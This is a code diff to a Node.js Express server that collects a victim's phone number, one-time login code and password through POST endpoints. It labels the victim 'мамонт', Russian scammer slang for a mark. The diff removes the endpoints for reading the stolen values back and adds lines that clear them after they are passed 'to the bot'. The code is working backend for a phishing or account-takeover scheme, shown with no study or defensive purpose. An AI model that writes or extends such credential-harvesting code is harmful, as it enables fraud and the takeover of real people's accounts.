@@ -36,21 +36,13 @@ app.post('/phone', (req, res) => {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
+        // Установить значение pn в undefined после передачи данных боту
+        pn = undefined;
         return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
         res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
         return;
-    }
-});
-
-app.get('/getPhone', (req, res) => {
-    if(pn){
-        res.send(`Номер телефона мамонта: ${pn}`);
-        return 0;
-    } else {
-        res.status(404).send('Номер телефона мамонта не найден.');
-        return 0;
     }
 });
 
@@ -60,20 +52,12 @@ app.post('/authCode', (req, res) => {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
+        // Установить значение code в undefined после передачи данных боту
+        code = undefined;
         return 0;
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
-        return 0;
-    }
-});
-
-app.get('/getCode', (req, res) => {
-    if(code){
-        res.send(`Код мамонта:\n${code}`);
-        return 0;
-    } else {
-        res.status(404).send('Код мамонта не найден.');
         return 0;
     }
 });
@@ -84,20 +68,12 @@ app.post('/password', (req, res) => {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
+        // Установить значение pass в undefined после передачи данных боту
+        pass = undefined;
         return;
     } else {
         console.log('Пароль мамонта неопределен.');
         res.status(400).json({ error: 'Пароль мамонта неопределен.' });
-        return;
-    }
-});
-
-app.get('/getPassword', (req, res) => {
-    if(pass){
-        res.send(`Пароль мамонта: ${pass}`);
-        return;
-    } else {
-        res.status(404).send('Пароль мамонта не найден.');
         return;
     }
 });
